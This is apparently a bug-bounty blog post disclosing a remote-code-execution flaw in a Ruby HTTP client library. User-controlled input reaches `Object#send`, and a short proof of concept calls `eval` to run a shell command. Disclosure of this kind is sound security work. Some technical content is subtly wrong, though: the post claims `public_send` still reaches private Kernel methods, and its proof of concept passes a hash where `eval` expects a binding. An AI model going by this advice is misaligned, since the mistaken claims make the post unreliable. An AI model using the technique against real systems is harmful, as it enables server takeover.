---
title: "The Unsafe Send: How an HTTP Client Library Led to Remote Code Execution"
date: 2026-02-21
tags: ["web", "rce", "source-code", "bug-bounty"]
---

Finding a vulnerability in a core library is always a "hold your breath" moment. You realize the impact isn't limited to one endpoint — it's potentially every application that includes that dependency.

While auditing a Ruby-based HTTP client library (vendor redacted), I found a critical RCE that allowed me to escape a simple HTTP request and execute arbitrary system commands. All it took was a developer trusting a "verb."

## Reconnaissance

I've been spending a lot of time lately looking at how modern applications handle outgoing requests. Webhooks, third-party integrations, API wrappers — they all rely on a handful of standard gems. I started mapping the attack surface of `redacted`, a lightweight wrapper around `Faraday`. No agenda, just following the code.

My first stop was the core request handler. If there was a flaw, it would be where the library translates user-provided options into actual network calls.

## The Rabbit Hole

My initial instinct: SSRF. I checked how redirects were handled, how base URLs were parsed, whether there were any internal IP blacklists. Nothing interesting. Most users were expected to provide the base URL themselves, which limited exploitability in a typical context.

I was about to move on when I noticed how the library handled different HTTP methods.

## The "Aha!" Moment

The breakthrough was in `lib/redacted/redacted.rb` — a method called `perform_request`:

```ruby
def perform_request(http_verb: :get, resource_path: '/', data_body: {})
  # ... setup logic ...
  connection.send(http_verb, resource_path, data_body) do |req|
    yield(req) if block_given?
  end
  # ... response handling ...
end
```

In Ruby, `send` is powerful and dangerous. It invokes **any** method on an object by name. The developer intended `http_verb` to be `:get` or `:post` — but there was zero validation.

Since `connection` inherits from `Object` and includes the `Kernel` module, it has access to `eval`, `system`, and `exec`. If I controlled `http_verb` and `resource_path`, I could call `eval` with arbitrary Ruby code.

## Proof of Concept

```ruby
attacker_verb    = "eval"
attacker_payload = "system('whoami > /tmp/pwned')"

client = Redacted::Request.new(base_url: "https://redacted.com")

client.perform_request(
  http_verb:     attacker_verb,
  resource_path: attacker_payload,
  data_body:     {}
)
```

It worked. `send` doesn't care about method visibility — I went straight from "sending an HTTP request" to executing system commands.

## Impact

Any application using this library that lets a user specify the HTTP method — a webhook tester, a proxy tool, an API explorer — is instantly vulnerable to full server takeover. An attacker can execute arbitrary shell commands, exfiltrate environment variables (AWS keys, database credentials), and establish persistence.

## Key Takeaways

- **Never use `Object#send` with user input.** If you must, validate against a strict allowlist of permitted methods.
- **`public_send` isn't safe either.** `Kernel` methods are still reachable.
- **Library maintainers:** validate that the HTTP verb is actually an HTTP verb.

## Timeline

| Date | Event |
|------|-------|
| Jan 20, 2026 | Reported |
| Feb 18, 2026 | Triaged |
| Feb 18, 2026 | Rewarded — $750 bounty |
| Feb 18, 2026 | Resolved |
